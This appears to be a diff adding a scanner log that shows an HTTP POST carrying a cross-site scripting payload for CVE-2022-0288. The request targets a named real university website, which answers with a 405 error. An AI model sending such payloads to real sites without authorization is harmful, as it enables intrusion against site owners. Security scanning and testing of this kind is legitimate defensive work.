@@ -1,0 +1,45 @@
+[CVE-2022-0288] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au
+
+
+POST / HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 74
+Accept: */*
+Accept-Language: en
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+html_element_selection=</script><img+src+onerror=alert(document.domain)>
+
+[CVE-2022-0288] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au
+
+HTTP/1.1 405 Method Not Allowed
+Connection: close
+Content-Length: 422
+Allow: GET, HEAD, OPTIONS
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:19:00 GMT
+Server: AmazonS3
+Via: 1.1 a4a1a8623588f9bc9a574eed729d35de.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: lM10EmA_bnYxkw4OHHRFvydSy-HR_-eQ-VABrYMEA7z8xMdd_v1WoQ==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>405 Method Not Allowed</title></head>
+<body>
+<h1>405 Method Not Allowed</h1>
+<ul>
+<li>Code: MethodNotAllowed</li>
+<li>Message: The specified method is not allowed against this resource.</li>
+<li>Method: POST</li>
+<li>ResourceType: OBJECT</li>
+<li>RequestId: X4B5YVB4KDXB240S</li>
+<li>HostId: QGrIjdWyKONGBb0I/zKrGXY3TvolfvdECiHkchzBFoTWbVPH4g4/X4NiZlgHN8V16ZgjvJWpt2I=</li>
+</ul>
+<hr/>
+</body>
+</html>
+
